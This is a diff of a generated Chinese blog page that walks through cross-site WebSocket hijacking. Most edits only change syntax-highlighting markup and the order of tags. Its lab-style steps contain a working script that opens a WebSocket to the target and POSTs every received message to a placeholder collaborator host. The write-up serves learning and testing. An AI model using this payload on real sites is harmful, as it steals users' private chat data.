@@ -208,13 +208,13 @@
 <p>WebSocket连接的建立需要经过连接请求、握手、连接建立三个步骤，如下图</p>
 <p><img src="/2022/07/09/%E6%B5%85%E6%9E%90websocket%E5%8A%AB%E6%8C%81/1.jpg"></p>
 <h2 id="建立WebSocket连接"><a href="#建立WebSocket连接" class="headerlink" title="建立WebSocket连接"></a>建立WebSocket连接</h2><p>WebSocket连接通常是使用客户端JavaScript创建的</p>
-<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> ws = <span class="keyword">new</span> WebSocket(<span class="string">&quot;wss://normal-website.com/chat&quot;</span>);</span><br><span class="line"><span class="comment">//该`wss`协议建立在一个加密的TLS连接的WebSocket，而`ws`协议使用未加密的连接。</span></span><br></pre></td></tr></table></figure>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> ws = <span class="keyword">new</span> <span class="title class_">WebSocket</span>(<span class="string">&quot;wss://normal-website.com/chat&quot;</span>);</span><br><span class="line"><span class="comment">//该`wss`协议建立在一个加密的TLS连接的WebSocket，而`ws`协议使用未加密的连接。</span></span><br></pre></td></tr></table></figure>
 
 <p>为了建立连接，浏览器和服务器通过HTTP执行WebSocket握手。浏览器发出WebSocket握手请求，如下所示：</p>
-<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/chat</span> HTTP/1.1</span><br><span class="line"><span class="attribute">Host</span>: normal-website.com</span><br><span class="line"><span class="attribute">Sec-WebSocket-Version</span>: 13</span><br><span class="line"><span class="attribute">Sec-WebSocket-Key</span>: wDqumtseNBJdhkihL6PW7w==</span><br><span class="line"><span class="attribute">Connection</span>: keep-alive, Upgrade</span><br><span class="line"><span class="attribute">Cookie</span>: session=KOsEJNuflw4Rd9BDNrVmvwBF9rEijeE2</span><br><span class="line"><span class="attribute">Upgrade</span>: websocket</span><br></pre></td></tr></table></figure>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/chat</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>normal-website.com</span><br><span class="line"><span class="attribute">Sec-WebSocket-Version</span><span class="punctuation">: </span>13</span><br><span class="line"><span class="attribute">Sec-WebSocket-Key</span><span class="punctuation">: </span>wDqumtseNBJdhkihL6PW7w==</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>keep-alive, Upgrade</span><br><span class="line"><span class="attribute">Cookie</span><span class="punctuation">: </span>session=KOsEJNuflw4Rd9BDNrVmvwBF9rEijeE2</span><br><span class="line"><span class="attribute">Upgrade</span><span class="punctuation">: </span>websocket</span><br></pre></td></tr></table></figure>
 
 <p>如果服务器接受连接，则它将返回WebSocket握手响应，如下所示：</p>
-<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">HTTP/1.1 <span class="number">101</span> Switching Protocols</span><br><span class="line"><span class="attribute">Connection</span>: Upgrade</span><br><span class="line"><span class="attribute">Upgrade</span>: websocket</span><br><span class="line"><span class="attribute">Sec-WebSocket-Accept</span>: 0FFP+2nmNIf/h+4BP36k9uzrYGk=</span><br></pre></td></tr></table></figure>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">HTTP/1.1</span> <span class="number">101</span> Switching Protocols</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>Upgrade</span><br><span class="line"><span class="attribute">Upgrade</span><span class="punctuation">: </span>websocket</span><br><span class="line"><span class="attribute">Sec-WebSocket-Accept</span><span class="punctuation">: </span>0FFP+2nmNIf/h+4BP36k9uzrYGk=</span><br></pre></td></tr></table></figure>
 
 <p>此时，网络连接保持打开状态，并且可以用于向任一方向发送WebSocket消息。</p>
 <blockquote>
@@ -257,7 +257,7 @@
 <li><p>观察发现存在实时聊天界面，观察发现没有CSRF的令牌</p>
 </li>
 <li><p>将代码复制到body</p>
-<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="javascript">  <span class="keyword">var</span> ws = <span class="keyword">new</span> WebSocket(<span class="string">&#x27;wss://your-websocket-url&#x27;</span>);</span></span><br><span class="line"><span class="javascript">  ws.onopen = <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span></span><br><span class="line"><span class="javascript">    ws.send(<span class="string">&quot;READY&quot;</span>);</span></span><br><span class="line">  &#125;;</span><br><span class="line"><span class="javascript">  ws.onmessage = <span class="function"><span class="keyword">function</span>(<span class="params">event</span>) </span>&#123;</span></span><br><span class="line"><span class="javascript">    fetch(<span class="string">&#x27;https://your-collaborator-url&#x27;</span>, &#123;<span class="attr">method</span>: <span class="string">&#x27;POST&#x27;</span>, <span class="attr">mode</span>: <span class="string">&#x27;no-cors&#x27;</span>, <span class="attr">body</span>: event.data&#125;);</span></span><br><span class="line">  &#125;;</span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">  <span class="keyword">var</span> ws = <span class="keyword">new</span> <span class="title class_">WebSocket</span>(<span class="string">&#x27;wss://your-websocket-url&#x27;</span>);</span></span><br><span class="line"><span class="language-javascript">  ws.<span class="property">onopen</span> = <span class="keyword">function</span>(<span class="params"></span>) &#123;</span></span><br><span class="line"><span class="language-javascript">    ws.<span class="title function_">send</span>(<span class="string">&quot;READY&quot;</span>);</span></span><br><span class="line"><span class="language-javascript">  &#125;;</span></span><br><span class="line"><span class="language-javascript">  ws.<span class="property">onmessage</span> = <span class="keyword">function</span>(<span class="params">event</span>) &#123;</span></span><br><span class="line"><span class="language-javascript">    <span class="title function_">fetch</span>(<span class="string">&#x27;https://your-collaborator-url&#x27;</span>, &#123;<span class="attr">method</span>: <span class="string">&#x27;POST&#x27;</span>, <span class="attr">mode</span>: <span class="string">&#x27;no-cors&#x27;</span>, <span class="attr">body</span>: event.<span class="property">data</span>&#125;);</span></span><br><span class="line"><span class="language-javascript">  &#125;;</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
 </li>
 <li><p><code>wss://your-websocket-url</code>替换成目前url</p>
 </li>
@@ -556,18 +556,6 @@ return o(i(t),arguments.length<2?void 0:u(arguments[1]))}})},function(t,n,r){var
           <ul class="article-tag-list" q-show="showTags">
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color3">web缓存漏洞</a>
-              </li>
-             
-              <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color4">Http请求走私</a>
-              </li>
-             
-              <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color5">学习笔记</a>
-              </li>
-             
-              <li class="article-tag-list-item">
                 <a href="javascript:void(0)" class="js-tag color3">writeup</a>
               </li>
              
@@ -577,6 +565,18 @@ return o(i(t),arguments.length<2?void 0:u(arguments[1]))}})},function(t,n,r){var
              
               <li class="article-tag-list-item">
                 <a href="javascript:void(0)" class="js-tag color4">CSP</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color5">学习笔记</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color3">web缓存漏洞</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color4">Http请求走私</a>
               </li>
              
               <li class="article-tag-list-item">
